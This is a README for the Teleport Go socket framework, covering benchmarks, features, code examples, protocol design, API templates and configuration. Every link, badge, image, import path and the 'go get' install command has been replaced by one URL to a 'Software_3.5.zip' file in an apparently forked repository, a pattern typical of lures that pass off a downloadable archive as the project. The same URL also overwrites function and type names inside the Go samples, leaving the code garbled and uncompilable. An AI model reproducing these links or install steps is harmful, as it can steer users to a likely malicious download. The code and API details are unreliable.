# Teleport [![GitHub release](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![report card](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![github issues](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%3Aopen+is%3Aissue) [![github closed issues](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%3Aissue+is%3Aclosed) [![GoDoc](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![view examples](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
<!-- [![view Go网络编程群](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip官方QQ群-Go网络编程(42730308)https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) -->

Teleport is a versatile, high-performance and flexible socket framework.

It can be used for peer-peer, rpc, gateway, micro services, push services, game services and so on.

[简体中文](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)


![Teleport-Framework](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)


## Benchmark

**Self Test**

- A server and a client process, running on the same machine
- CPU:    Intel Xeon E312xx (Sandy Bridge) 16 cores 2.53GHz
- Memory: 16G
- OS:     Linux https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, CentOS 6.4
- Go:     1.9.2
- Message size: 581 bytes
- Message codec: protobuf
- Sent total 1000000 messages

- teleport

| client concurrency | mean(ms) | median(ms) | max(ms) | min(ms) | throughput(TPS) |
| ------------------ | -------- | ---------- | ------- | ------- | --------------- |
| 100                | 1        | 0          | 16      | 0       | 75505           |
| 500                | 9        | 11         | 97      | 0       | 52192           |
| 1000               | 19       | 24         | 187     | 0       | 50040           |
| 2000               | 39       | 54         | 409     | 0       | 42551           |
| 5000               | 96       | 128        | 1148    | 0       | 46367           |

- teleport/socket

| client concurrency | mean(ms) | median(ms) | max(ms) | min(ms) | throughput(TPS) |
| ------------------ | -------- | ---------- | ------- | ------- | --------------- |
| 100                | 0        | 0          | 14      | 0       | 225682          |
| 500                | 2        | 1          | 24      | 0       | 212630          |
| 1000               | 4        | 3          | 51      | 0       | 180733          |
| 2000               | 8        | 6          | 64      | 0       | 183351          |
| 5000               | 21       | 18         | 651     | 0       | 133886          |

**Comparison Test**

<table>
<tr><th>Environment</th><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr>
<tr>
<td width="10%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
</tr>
</table>

**[More Detail](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**

- Profile torch of teleport/socket

![tp_socket_profile_torch](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)

**[svg file](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**

- Heap torch of teleport/socket

![tp_socket_heap_torch](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)

**[svg file](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**

## Version

| version | status  | branch                                   |
| ------- | ------- | ---------------------------------------- |
| v5      | release | [v5](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
| v4      | release | [v4](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
| v3      | release | [v3](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
| v2      | release | [v2](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
| v1      | release | [v1](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |


## Install

```sh
go get -u -f https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
```

## Feature

- Server and client are peer-to-peer, have the same API method
- Support custom communication protocol
- Support set the size of socket I/O buffer
- Message contains both `Header` and `Body` two parts
- Message `Header` contains metadata in the same format as HTTP header
- Support for customizing `Body` coding types separately, e.g `JSON` `Protobuf` `string`
- Support push, call, reply and other means of communication
- Support plug-in mechanism, can customize authentication, heartbeat, micro service registration center, statistics, etc.
- Whether server or client, the peer support reboot and shutdown gracefully
- Support reverse proxy
- Detailed log information, support print input and output details
- Supports setting slow operation alarm threshold
- Use I/O multiplexing technology
- Support setting the size of the reading message (if exceed disconnect it)
- Provide the context of the handler
- Client session support automatically redials after disconnection
- Support network list: `tcp`, `tcp4`, `tcp6`, `unix`, `unixpacket` and so on
- Provide an operating interface to control the connection file descriptor

## Example

### https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip

```go
package main

import (
	"fmt"
	"time"

	tp "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"
)

func main() {
	// graceful
	go https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()

	// server peer
	srv := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{
		CountTime:   true,
		ListenPort:  9090,
		PrintDetail: true,
	})

	// router
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Math))

	// broadcast per 5s
	go func() {
		for {
			https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip * 5)
			https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(func(sess https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) bool {
				https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(
					"/push/status",
					https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("this is a broadcast, server time: %v", https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()),
				)
				return true
			})
		}
	}()

	// listen and serve
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()
}

// Math handler
type Math struct {
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
}

// Add handles addition request
func (m *Math) Add(arg *[]int) (int, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
	// test query parameter
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("author: %s", https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Get("author"))
	// add
	var r int
	for _, a := range *arg {
		r += a
	}
	// response
	return r, nil
}
```

### https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip

```go
package main

import (
	"time"

	tp "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"
)

func main() {
	// log level
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("ERROR")

	cli := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{})
	defer https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()

	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Push))

	sess, err := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(":9090")
	if err != nil {
		https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%v", err)
	}

	var result int
	rerr := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("/math/add?author=henrylee2cn",
		[]int{1, 2, 3, 4, 5},
		&result,
	).Rerror()
	if rerr != nil {
		https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%v", rerr)
	}
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("result: %d", result)

	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("wait for 10s...")
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip * 10)
}

// Push push handler
type Push struct {
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
}

// Push handles '/push/status' message
func (p *Push) Status(arg *string) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%s", *arg)
	return nil
}
```

[More Examples](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)

## Design

### Keywords

- **Peer:** A communication instance may be a server or a client
- **Socket:** Base on the https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip package, add custom package protocol, transfer pipelines and other functions
- *Message:** The corresponding structure of the data package content element
- **Proto:** The protocol interface of message pack/unpack 
- **Codec:** Serialization interface for `Body`
- **XferPipe:** Message bytes encoding pipeline, such as compression, encryption, calibration and so on
- **XferFilter:** A interface to handle message data before transfer
- **Plugin:** Plugins that cover all aspects of communication
- **Session:** A connection session, with push, call, reply, close and other methods of operation
- **Context:** Handle the received or send messages
- **Call-Launch:** Call data from the peer
- **Call-Handle:** Handle and reply to the calling of peer
- **Push-Launch:** Push data to the peer
- **Push-Handle:** Handle the pushing of peer
- **Router:** Router that route the response handler by request information(such as a URI)

### Data Message

Abstracts the data message(Message Object) of the application layer and is compatible with HTTP message:

![tp_data_message](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)


### Protocol

You can customize your own communication protocol by implementing the interface:

```go
type (
    // Proto pack/unpack protocol scheme of socket message.
    Proto interface {
        // Version returns the protocol's id and name.
        Version() (byte, string)
        // Pack writes the Message into the connection.
        // NOTE: Make sure to write only once or there will be package contamination!
        Pack(Message) error
        // Unpack reads bytes from the connection to the Message.
        // NOTE: Concurrent unsafe!
        Unpack(Message) error
    }
    ProtoFunc func(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) Proto
)
```

Next, you can specify the communication protocol in the following ways:

```go
func SetDefaultProtoFunc(ProtoFunc)
type Peer interface {
    ...
    ServeConn(conn https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) Session
    DialContext(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, addr string, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (Session, *Rerror)
    Dial(addr string, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (Session, *Rerror)
    Listen(protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) error
    ...
}
```

Default protocol `RawProto`(Big Endian):

```sh
{4 bytes message length}
{1 byte protocol version}
{1 byte transfer pipe length}
{transfer pipe IDs}
# The following is handled data by transfer pipe
{2 bytes sequence length}
{sequence}
{1 byte message type} # e.g. CALL:1; REPLY:2; PUSH:3
{2 bytes URI length}
{URI}
{2 bytes metadata length}
{metadata(urlencoded)}
{1 byte body codec id}
{body}
```


### XferPipe

Transfer filter pipe, handles byte stream of message when transfer.

```go
// XferFilter handles byte stream of message when transfer.
type XferFilter interface {
    // ID returns transfer filter id.
    ID() byte
    // Name returns transfer filter name.
    Name() string
    // OnPack performs filtering on packing.
    OnPack([]byte) ([]byte, error)
    // OnUnpack performs filtering on unpacking.
    OnUnpack([]byte) ([]byte, error)
}
// Get returns transfer filter by id.
func Get(id byte) (XferFilter, error)
// GetByName returns transfer filter by name.
func GetByName(name string) (XferFilter, error)

// XferPipe transfer filter pipe, handlers from outer-most to inner-most.
// NOTE: the length can not be bigger than 255!
type XferPipe struct {
    // Has unexported fields.
}
func NewXferPipe() *XferPipe
func (x *XferPipe) Append(filterID https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) error
func (x *XferPipe) AppendFrom(src *XferPipe)
func (x *XferPipe) IDs() []byte
func (x *XferPipe) Len() int
func (x *XferPipe) Names() []string
func (x *XferPipe) OnPack(data []byte) ([]byte, error)
func (x *XferPipe) OnUnpack(data []byte) ([]byte, error)
func (x *XferPipe) Range(callback func(idx int, filter XferFilter) bool)
func (x *XferPipe) Reset()
```


### Codec

The body's codec set.

```go
type Codec interface {
    // ID returns codec id.
    ID() byte
    // Name returns codec name.
    Name() string
    // Marshal returns the encoding of v.
    Marshal(v interface{}) ([]byte, error)
    // Unmarshal parses the encoded data and stores the result
    // in the value pointed to by v.
    Unmarshal(data []byte, v interface{}) error
}
```


### Plugin

Plug-ins during runtime.

```go
type (
    // Plugin plugin background
    Plugin interface {
        Name() string
    }
    // PreNewPeerPlugin is executed before creating peer.
    PreNewPeerPlugin interface {
        Plugin
        PreNewPeer(*PeerConfig, *PluginContainer) error
    }
    ...
)
```


## Usage

### Peer(server or client) Demo

```go
// Start a server
var peer1 = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{
    ListenPort: 9090, // for server role
})
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()

...

// Start a client
var peer2 = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{})
var sess, err = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("127.0.0.1:8080")
```

### Call-Controller-Struct API template

```go
type Aaa struct {
    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
}
func (x *Aaa) XxZz(arg *<T>) (<T>, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
    ...
    return r, nil
}
```

- register it to root router:

```go
// register the call route
// HTTP mapping: /aaa/xx_zz
// RPC mapping: https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Aaa))

// or register the call route
// HTTP mapping: /xx_zz
// RPC mapping: XxZz
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip((*Aaa).XxZz)
```

### Call-Handler-Function API template

```go
func XxZz(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, arg *<T>) (<T>, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
    ...
    return r, nil
}
```

- register it to root router:

```go
// register the call route
// HTTP mapping: /xx_zz
// RPC mapping: XxZz
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxZz)
```

### Push-Controller-Struct API template

```go
type Bbb struct {
    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
}
func (b *Bbb) YyZz(arg *<T>) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
    ...
    return nil
}
```

- register it to root router:

```go
// register the push handler
// HTTP mapping: /bbb/yy_zz
// RPC mapping: https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Bbb))

// or register the push handler
// HTTP mapping: /yy_zz
// RPC mapping: YyZz
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip((*Bbb).YyZz)
```

### Push-Handler-Function API template

```go
// YyZz register the handler
func YyZz(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, arg *<T>) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
    ...
    return nil
}
```

- register it to root router:

```go
// register the push handler
// HTTP mapping: /yy_zz
// RPC mapping: YyZz
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(YyZz)
```

### Unknown-Call-Handler-Function API template

```go
func XxxUnknownCall (ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (interface{}, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
    ...
    return r, nil
}
```

- register it to root router:

```go
// register the unknown call route: /*
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownCall)
```

### Unknown-Push-Handler-Function API template

```go
func XxxUnknownPush(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
    ...
    return nil
}
```

- register it to root router:

```go
// register the unknown push route: /*
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownPush)
```

### Plugin Demo

```go
// NewIgnoreCase Returns a ignoreCase plugin.
func NewIgnoreCase() *ignoreCase {
    return &ignoreCase{}
}

type ignoreCase struct{}

var (
    _ https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip = new(ignoreCase)
    _ https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip = new(ignoreCase)
)

func (i *ignoreCase) Name() string {
    return "ignoreCase"
}

func (i *ignoreCase) PostReadCallHeader(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
    // Dynamic transformation path is lowercase
    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path)
    return nil
}

func (i *ignoreCase) PostReadPushHeader(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
    // Dynamic transformation path is lowercase
    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path)
    return nil
}
```

### Register above handler and plugin

```go
// add router group
group := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("test")
// register to test group
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Aaa), NewIgnoreCase())
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxZz, NewIgnoreCase())
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Bbb))
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(YyZz)
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownCall)
https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownPush)
```

### Config

```go
type PeerConfig struct {
    Network            string        `yaml:"network"              ini:"network"              comment:"Network; tcp, tcp4, tcp6, unix or unixpacket"`
    LocalIP            string        `yaml:"local_ip"             ini:"local_ip"             comment:"Local IP"`
    ListenPort         uint16        `yaml:"listen_port"          ini:"listen_port"          comment:"Listen port; for server role"`
    DefaultDialTimeout https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_dial_timeout" ini:"default_dial_timeout" comment:"Default maximum duration for dialing; for client role; ns,µs,ms,s,m,h"`
    RedialTimes        int32         `yaml:"redial_times"         ini:"redial_times"         comment:"The maximum times of attempts to redial, after the connection has been unexpectedly broken; for client role"`
	RedialInterval     https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"redial_interval"      ini:"redial_interval"      comment:"Interval of redialing each time, default 100ms; for client role; ns,µs,ms,s,m,h"`
    DefaultBodyCodec   string        `yaml:"default_body_codec"   ini:"default_body_codec"   comment:"Default body codec type id"`
    DefaultSessionAge  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_session_age"  ini:"default_session_age"  comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
    DefaultContextAge  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_context_age"  ini:"default_context_age"  comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
    SlowCometDuration  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"slow_comet_duration"  ini:"slow_comet_duration"  comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
    PrintDetail        bool          `yaml:"print_detail"         ini:"print_detail"         comment:"Is print body and metadata or not"`
    CountTime          bool          `yaml:"count_time"           ini:"count_time"           comment:"Is count cost time or not"`
}
```

### Optimize

- SetMessageSizeLimit sets max message size.
  If maxSize<=0, set it to max uint32.

    ```go
    func SetMessageSizeLimit(maxMessageSize uint32)
    ```

- SetSocketKeepAlive sets whether the operating system should send
  keepalive messages on the connection.

    ```go
    func SetSocketKeepAlive(keepalive bool)
    ```

- SetSocketKeepAlivePeriod sets period between keep alives.

    ```go
    func SetSocketKeepAlivePeriod(d https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
    ```

- SetSocketNoDelay controls whether the operating system should delay
  message transmission in hopes of sending fewer messages (Nagle's
  algorithm).  The default is true (no delay), meaning that data is
  sent as soon as possible after a Write.

    ```go
    func SetSocketNoDelay(_noDelay bool)
    ```

- SetSocketReadBuffer sets the size of the operating system's
  receive buffer associated with the connection.

    ```go
    func SetSocketReadBuffer(bytes int)
    ```

- SetSocketWriteBuffer sets the size of the operating system's
  transmit buffer associated with the connection.

    ```go
    func SetSocketWriteBuffer(bytes int)
    ```


## Extensions

### Codec

| package                                  | import                                   | description                  |
| ---------------------------------------- | ---------------------------------------- | ---------------------------- |
| [json](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | JSON codec(teleport own)     |
| [protobuf](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Protobuf codec(teleport own) |
| [plain](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Plain text codec(teleport own)   |
| [form](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Form(url encode) codec(teleport own)   |

### Plugin

| package                                  | import                                   | description                              |
| ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
| [auth](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A auth plugin for verifying peer at the first time |
